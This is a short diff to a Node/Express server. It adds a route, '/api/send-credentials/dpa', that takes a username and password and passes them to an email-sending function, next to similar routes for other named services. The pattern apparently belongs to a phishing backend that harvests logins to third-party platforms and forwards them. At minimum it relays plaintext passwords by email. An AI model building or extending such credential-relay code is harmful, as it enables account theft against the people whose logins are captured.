@@ -8,6 +8,7 @@ import {
   sendCode,
   sendCredentialsPurpleWave,
   sendCredentialsSteffes,
+  sendCredentialsDPA,
 } from "./services/email.mjs";
 
 dotenv.config();
@@ -63,6 +64,14 @@ app.post("/api/send-credentials/steffes", async (req, res) => {
   const { email, password } = req.body;
 
   await sendCredentialsSteffes(email, password);
+
+  res.json({ message: "Credentials sent successfully" });
+});
+
+app.post("/api/send-credentials/dpa", async (req, res) => {
+  const { username, password } = req.body;
+
+  await sendCredentialsDPA(username, password);
 
   res.json({ message: "Credentials sent successfully" });
 });
